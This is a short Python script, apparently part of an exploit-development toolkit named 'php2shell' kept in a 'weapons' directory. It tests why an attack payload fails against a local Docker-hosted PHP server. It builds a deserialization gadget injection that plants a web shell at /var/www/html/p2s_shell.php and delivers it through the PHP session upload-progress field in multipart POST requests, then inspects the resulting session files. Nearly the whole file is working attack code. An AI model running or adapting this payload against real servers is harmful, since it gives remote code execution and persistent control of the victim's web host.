#!/usr/bin/env python3
"""Bisect the weapon's sessgap body vs the working manual probe."""
import sys
sys.path.insert(0, "/mnt/c/Users/andre/Downloads/php2shell-zeros/weapons")
from php2shell import (multipart_body, build_gadget_injection, WEBSHELL,
                       raw_post)

HOST, PORT = "127.0.0.1", 8085
gadget = "DeferredWriter"
shell_path = "/var/www/html/p2s_shell.php"
sid = "p2s" + "0" * 27

inj = build_gadget_injection(gadget, {"path": shell_path, "data": WEBSHELL})
print("INJ:", inj)

def post_and_check(label, fields, files):
    body = multipart_body(fields, files)
    code, resp = raw_post(HOST, PORT, "/up.php", {
        "Cookie": f"PHPSESSID={sid}",
        "Content-Type": "multipart/form-data; boundary=P2Sbound2026"}, body)
    print(f"[{label}] {code}")
    import subprocess
    r = subprocess.run(["docker", "exec", "van85", "sh", "-c",
                        "ls -la /tmp/sess_p2s* 2>/dev/null | wc -l; "
                        "head -c 130 /tmp/sess_p2s000000000000000000000000000 2>/dev/null"],
                       capture_output=True, text=True)
    print("    session:", r.stdout.strip()[:200])

# A: exact weapon shape (progress + PHPSESSID fields, 1MB file)
post_and_check("A weapon-shape",
               [("PHP_SESSION_UPLOAD_PROGRESS", inj), ("PHPSESSID", sid)],
               [("f", "notes.txt", b"A" * (1024 * 1024))])

# B: probe shape (progress only, small file)
post_and_check("B probe-shape",
               [("PHP_SESSION_UPLOAD_PROGRESS", inj)],
               [("f", "notes.txt", b"hello")])
